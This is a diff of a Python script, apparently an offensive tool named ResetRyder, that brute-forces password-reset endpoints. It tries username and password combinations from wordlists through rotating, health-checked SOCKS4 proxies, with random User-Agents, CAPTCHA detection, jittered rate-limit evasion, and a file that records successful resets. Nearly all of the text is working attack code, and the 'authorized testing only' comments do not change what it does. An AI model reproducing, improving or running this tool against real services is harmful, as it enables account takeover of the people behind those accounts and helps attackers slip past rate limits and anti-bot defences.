@@ -4,82 +4,223 @@ import asyncio
 import aiohttp
 import logging
 import json
+import time
+import re
+import aiofiles
+from aiohttp_socks import ProxyConnector
+from fake_useragent import UserAgent
+from typing import List, Dict, Optional, Tuple
+from concurrent.futures import ThreadPoolExecutor
 
 # Developer: SirCryptic (NullSecurityTeam)
-# Info: ResetRyder - Brute force password reset tool - By NullSecurityTeam
-# This code is intended for educational purposes only. Ensure you have permission to test any systems.
+# Info: ResetRyder - Advanced password reset brute-forcer - By NullSecurityTeam
+# For authorized testing only. Unauthorized use is illegal.
 
-# Set up logging
+# Logging setup
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
+logger = logging.getLogger(__name__)
 
-# Argument parser setup
-parser = argparse.ArgumentParser(description="ResetRyder - Brute force password reset tool - By NullSecurityTeam")
-parser.add_argument("-p", "--password_list", required=True, help="Path to the password list file")
-parser.add_argument("-u", "--username_list", required=True, help="Path to the username list file")
-parser.add_argument("-r", "--reset_password_url", required=True, help="Reset password URL")
-parser.add_argument("-t", "--rate_limit_time", type=float, default=1.0, help="Rate limiting time in seconds")
-parser.add_argument("-x", "--proxy_list", required=True, help="Path to the SOCKS4 proxy list file")
-parser.add_argument("-a", "--max_retries", type=int, default=3, help="Maximum number of retries for failed requests")
-parser.add_argument("-o", "--max_timeout", type=int, default=10, help="Maximum timeout for requests in seconds")
-parser.add_argument("-c", "--max_concurrent_requests", type=int, default=10, help="Maximum number of concurrent requests")
+# Argument parser
+parser = argparse.ArgumentParser(description="ResetRyder - Advanced password reset brute-forcer")
+parser.add_argument("-c", "--config", default="config.json", help="Path to config file")
+parser.add_argument("-p", "--password_list", help="Path to password list file (overrides config)")
+parser.add_argument("-u", "--username_list", help="Path to username list file (overrides config)")
+parser.add_argument("-r", "--reset_url", help="Reset URL (overrides config)")
+parser.add_argument("-x", "--proxy_list", help="Path to SOCKS4 proxy list file (overrides config)")
+parser.add_argument("-t", "--rate_limit", type=float, help="Base rate limit in seconds (overrides config)")
+parser.add_argument("-m", "--max_concurrency", type=int, help="Max concurrent requests (overrides config)")
+parser.add_argument("-o", "--output_file", help="File for successful resets (overrides config)")
 args = parser.parse_args()
 
-# Load data from files
-def load_file(file_path):
-    with open(file_path, "r") as f:
-        return [line.strip() for line in f]
+# Load file helper
+def load_file(file_path: str) -> List[str]:
+    try:
+        with open(file_path, "r") as f:
+            return [line.strip() for line in f if line.strip()]
+    except Exception as e:
+        logger.error(f"Failed to load {file_path}: {e}")
+        exit(1)
 
-# Load configuration
-password_list = load_file(args.password_list)
-username_list = load_file(args.username_list)
-proxy_list = load_file(args.proxy_list)
+# Load config
+def load_config(config_path: str) -> Dict:
+    default_config = {
+        "reset_url": "",
+        "username_list": "usernames.txt",
+        "password_list": "passwords.txt",
+        "proxy_list": "proxies.txt",
+        "rate_limit": 1.0,
+        "max_concurrency": 10,
+        "timeout": 10,
+        "max_retries": 3,
+        "output_file": "success.json",
+        "payload": {"username": "{username}", "new_password": "{password}", "confirm_new_password": "{password}"},
+        "success_indicators": ["success", "reset successful"],
+        "failure_indicators": ["error", "invalid", "failed"],
+        "captcha_indicators": ["captcha", "recaptcha", "verify you are not a bot"],
+        "json_payload": False,
+        "headers": {"Accept": "application/json, text/plain, */*"}
+    }
+    try:
+        with open(config_path, "r") as f:
+            config = json.load(f)
+            default_config.update(config)
+    except FileNotFoundError:
+        logger.warning(f"Config file {config_path} not found, using defaults")
+    except json.JSONDecodeError:
+        logger.error(f"Invalid JSON in {config_path}, using defaults")
+    
+    # Override with CLI args if provided
+    if args.reset_url: default_config["reset_url"] = args.reset_url
+    if args.username_list: default_config["username_list"] = args.username_list
+    if args.password_list: default_config["password_list"] = args.password_list
+    if args.proxy_list: default_config["proxy_list"] = args.proxy_list
+    if args.rate_limit: default_config["rate_limit"] = args.rate_limit
+    if args.max_concurrency: default_config["max_concurrency"] = args.max_concurrency
+    if args.output_file: default_config["output_file"] = args.output_file
+    
+    return default_config
 
-async def reset_password(session, username, password):
-    for attempt in range(args.max_retries):
-        payload = {
-            "username": username,
-            "new_password": password,
-            "confirm_new_password": password
-        }
-        
-        # Randomly select a proxy
-        proxy = random.choice(proxy_list)
+config = load_config(args.config)
+ua = UserAgent()
+
+# Proxy pool with health check
+class ProxyPool:
+    def __init__(self, proxies: List[str], timeout: int = 5):
+        self.proxies = []
+        self.failed_proxies = set()
+        self.timeout = timeout
+        self._test_proxies(proxies)
+
+    def _check_proxy(self, proxy: str) -> bool:
+        try:
+            import socks
+            import socket
+            s = socks.socksocket()
+            s.set_proxy(socks.SOCKS4, *proxy.split(":"))
+            s.settimeout(self.timeout)
+            s.connect(("8.8.8.8", 53))
+            s.close()
+            return True
+        except Exception:
+            return False
+
+    def _test_proxies(self, proxies: List[str]):
+        logger.info("Testing proxies...")
+        with ThreadPoolExecutor(max_workers=20) as executor:
+            futures = {executor.submit(self._check_proxy, proxy): proxy for proxy in proxies}
+            for future in futures:
+                if future.result():
+                    self.proxies.append(futures[future])
+                else:
+                    self.failed_proxies.add(futures[future])
+        logger.info(f"Live proxies: {len(self.proxies)}, Failed: {len(self.failed_proxies)}")
+
+    def get_proxy(self) -> Optional[str]:
+        available = [p for p in self.proxies if p not in self.failed_proxies]
+        return random.choice(available) if available else None
+
+    def mark_failed(self, proxy: str):
+        self.failed_proxies.add(proxy)
+        logger.debug(f"Proxy failed: {proxy}")
+
+# Load data
+usernames = load_file(config["username_list"])
+passwords = load_file(config["password_list"])
+proxy_pool = ProxyPool(load_file(config["proxy_list"]), config["timeout"])
+
+# Dynamic headers
+def get_headers() -> Dict[str, str]:
+    headers = config["headers"].copy()
+    headers["User-Agent"] = ua.random
+    headers["Content-Type"] = "application/json" if config["json_payload"] else "application/x-www-form-urlencoded"
+    return headers
+
+# Password reset attempt
+async def reset_password(session: aiohttp.ClientSession, username: str, password: str) -> Tuple[bool, str]:
+    payload = {k: v.format(username=username, password=password) for k, v in config["payload"].items()}
+    data = json.dumps(payload) if config["json_payload"] else payload
+
+    for attempt in range(config["max_retries"]):
+        proxy = proxy_pool.get_proxy()
+        if not proxy:
+            logger.error("No live proxies remaining")
+            return False, "No proxies"
 
         try:
-            async with session.post(args.reset_password_url, data=payload, proxy=f'socks4://{proxy}', timeout=args.max_timeout) as response:
+            connector = ProxyConnector.from_url(f"socks4://{proxy}")
+            async with session.post(
+                config["reset_url"],
+                data=data,
+                headers=get_headers(),
+                connector=connector,
+                timeout=aiohttp.ClientTimeout(total=config["timeout"])
+            ) as response:
                 text = await response.text()
+                status = response.status
 
-                if response.status == 200 and "password reset successful" in text.lower():
-                    logging.info(f"Password reset successful for user {username}. New password: {password}")
-                    return True
-                else:
-                    logging.warning(f"Password reset failed for user {username} with password: {password}. Response: {text}")
+                # Check for CAPTCHA
+                if any(re.search(ind, text.lower()) for ind in config["captcha_indicators"]):
+                    logger.warning(f"CAPTCHA detected for {username}:{password}")
+                    return False, "CAPTCHA"
+
+                # Success/failure detection
+                if status == 200 and any(re.search(ind, text.lower()) for ind in config["success_indicators"]):
+                    logger.info(f"Success: {username} -> {password}")
+                    return True, ""
+                elif any(re.search(ind, text.lower()) for ind in config["failure_indicators"]) or status >= 400:
+                    logger.debug(f"Failed: {username}:{password} - Status: {status}")
+                    break
+                elif status == 429:  # Rate limit
+                    logger.warning(f"Rate limited for {username}:{password}")
+                    await asyncio.sleep(2 ** attempt)  # Exponential backoff
+
         except asyncio.TimeoutError:
-            logging.error(f"Timeout occurred for user {username} with password: {password}. Attempt: {attempt + 1}/{args.max_retries}")
+            logger.error(f"Timeout for {username}:{password} (Attempt {attempt + 1})")
+            proxy_pool.mark_failed(proxy)
         except Exception as e:
-            logging.error(f"Request failed for user {username} with password {password}: {str(e)}")
+            logger.error(f"Error for {username}:{password}: {e}")
+            proxy_pool.mark_failed(proxy)
 
-    return False
+        # Jittered retry delay
+        await asyncio.sleep(random.uniform(0.5, 1.5) * config["rate_limit"] * (2 ** attempt))
 
+    return False, "Max retries"
+
+# Main execution
 async def main():
+    logger.info("Starting ResetRyder - Authorized testing only!")
+    stats = {"attempts": 0, "success": 0, "captcha": 0, "failures": 0}
     async with aiohttp.ClientSession() as session:
+        semaphore = asyncio.Semaphore(config["max_concurrency"])
         tasks = []
-        semaphore = asyncio.Semaphore(args.max_concurrent_requests)
 
-        async def limited_reset(username, password):
+        async def limited_reset(username: str, password: str):
             async with semaphore:
-                await reset_password(session, username, password)
-                await asyncio.sleep(args.rate_limit_time)  # Rate limiting
+                stats["attempts"] += 1
+                success, reason = await reset_password(session, username, password)
+                if success:
+                    stats["success"] += 1
+                    async with aiofiles.open(config["output_file"], "a") as f:
+                        await f.write(json.dumps({"username": username, "password": password}) + "\n")
+                elif reason == "CAPTCHA":
+                    stats["captcha"] += 1
+                else:
+                    stats["failures"] += 1
+                await asyncio.sleep(random.uniform(0.8, 1.2) * config["rate_limit"])
+                return success
 
-        for username in username_list:
-            for password in password_list:
-                task = asyncio.create_task(limited_reset(username, password))
-                tasks.append(task)
+        # Process in chunks
+        for username in usernames:
+            for password in passwords:
+                tasks.append(limited_reset(username, password))
+                if len(tasks) >= config["max_concurrency"] * 2:
+                    await asyncio.gather(*tasks)
+                    logger.info(f"Progress: {stats}")
+                    tasks.clear()
 
-        results = await asyncio.gather(*tasks)
-        successful_requests = sum(result for result in results if result)
-        logging.info(f"Total requests: {len(results)}, Successful requests: {successful_requests}")
+        if tasks:
+            await asyncio.gather(*tasks)
+            logger.info(f"Final stats: {stats}")
 
-# Entry point
 if __name__ == "__main__":
     asyncio.run(main())
